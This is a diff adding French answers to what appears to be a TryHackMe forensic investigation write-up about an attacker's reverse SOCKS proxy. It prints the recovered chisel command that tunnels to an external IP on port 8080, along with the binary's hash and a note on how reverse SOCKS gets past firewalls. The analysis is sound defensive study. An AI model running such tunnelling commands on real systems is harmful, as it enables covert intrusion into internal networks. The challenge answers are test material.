@@ -161,7 +161,35 @@ En faisant des recherches sur internet, le port 5985 est utilisé pour la prise 
 
 ![Tryhackme](00-Images/5985.png)
 
-3 - L'attaquant a ensuite mis en place un reverse proxy afin d'accéder aux services internes hébergés sur la machine. Quelle est la commande exécutée par l'attaquant pour établir cette connexion ?
+3 - L'attaquant a ensuite mis en place un proxy SOCKS inversé afin d'accéder aux services internes hébergés sur la machine. Quelle est la commande exécutée par l'attaquant pour établir cette connexion ?
+
+SOCKS normal : l’attaquant (WAN) initie vers la victime (LAN) → entrant → le firewall bloque.
+SOCKS inversé : la victime (LAN) initie vers l’attaquant (WAN) → sortant → le firewall laisse passer.
+
+Pour trouver la commande on filtre sur l’exécutable ch.exe que l'on peut voir apparaitre dans la chaine en base64 décodé.
+
+![Tryhackme](00-Images/chexe.png)
+
+réponse : C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
+
+4 - Quel est le hash SHA256 du binaire utilisé par l'attaquant pour établir la connexion via le proxy SOCKS inversé ?
+
+On récupéré le hash de ch.exe dans le timeline explorer.
+
+![Tryhackme](00-Images/hashchexe.png)
+
+réponse : 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
+
+5 - Quel est le nom de l'outil utilisé par l'attaquant, d'après l'empreinte SHA256 ? Donnez la réponse en minuscules.
+
+On passe le hash dans virus total pour l'identifier :
+
+![Tryhackme](00-Images/chisel.png)
+
+réponse : chisel
+
+L'attaquant a ensuite utilisé les identifiants récupérés sur la machine. D'après les opérations ayant suivi l'exécution du proxy SOCKS, quel service l'attaquant a-t-il utilisé pour s'authentifier ?
+
 
 
 
